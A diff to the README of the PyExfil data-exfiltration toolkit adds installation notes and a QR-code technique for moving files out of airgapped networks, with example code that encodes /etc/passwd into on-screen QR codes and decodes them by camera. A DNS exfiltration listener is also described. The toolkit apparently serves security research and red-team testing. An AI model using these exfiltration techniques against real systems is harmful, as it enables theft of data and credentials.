@@ -17,7 +17,48 @@ This started as a PoC project but has later turned into something a bit more. Cu
 Package is still not really usable and will provide multiple issues. Please wait for a more reliable version to come along. You can track changes at the official [GitHub page](http://ytisf.github.io/PyExfil/).
 The release of Symantec's Regin research was the initiator of this module. It is inspired by some of the features of [Regin](http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance). Go read about it :)
 
+## Server Installation
+All requirements can be met with a `pip install --user -r requirments.txt`. After that the server is easy to execute. Notice that in some cases you might want to use `py2exe` before delivering the package to the code you want to operate.
+
 ## Techniques
+
+### Physical - QR
+
+So recently we have decided to impliment some physical data exfiltration techniques assuming some networks might be airgapped from any internet connectivity. So this is the first one. It will encode a file in several QR codes, display them on the screen one by one and it comes with a decoder to recompile that into the file itself.
+
+It was written under MacOS so for any bugs please report to us so that we can fix them.
+
+#### Prepare
+```bash
+brew tap homebrew/science
+brew install opencv
+pip install --user -r pyexfil/physical/qw/requirements.txt
+```
+
+#### To QR Codes
+```python
+from pyexfil.physical.qr.generator import CreateQRs, PlayQRs
+
+if __name__ == "__main__":
+    if CreateQRs('/etc/passwd'):
+        sys.stdout.write("Will now start playing the QRs.\n")
+        time.sleep(DELAY)
+        PlayQRs()  # This will play the QRs on screen
+    else:
+        sys.stderr.write("Something went wrong with creating QRs.\n")
+        sys.exit(1)
+
+```
+
+#### From QRs to File
+```python
+from pyexfil.physical.qr.decoder import startFlow, DIR_MODE, CAM_MODE
+
+if __name__ == "__main__":
+    startFlow(mode=DIR_MODE) # will use data in 'output' directory.
+    startFlow(mode=CAM_MODE) # will use data from camera
+
+```
 
 ### DNS
 This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It **does not** yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and *Wireshark* and *tcpdump* (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.
